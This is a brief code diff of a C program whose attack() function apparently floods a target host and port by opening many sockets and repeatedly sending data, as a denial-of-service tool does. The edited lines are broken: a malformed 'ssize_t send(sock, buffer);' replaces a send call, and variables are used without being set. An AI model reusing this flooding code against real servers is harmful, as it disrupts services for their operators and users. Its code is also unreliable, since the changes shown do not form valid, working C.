@@ -55,7 +55,7 @@ void broke(int s) {
 
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
-	int x, g=1, r;
+	int x, g=1, r, sock;
 	for(x=0; x!= CONNECTIONS; x++)
 		sockets[x]=0;
 	signal(SIGPIPE, &broke);
@@ -63,7 +63,7 @@ void attack(char *host, char *port, int id) {
 		for(x=0; x != PPS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
-		    ssize_t send(sockets, buffer);
+		    ssize_t send(sock, buffer);
 			if(r == -1) {
 				close(sockets[x]);
 				sockets[x] = make_socket(host, port);
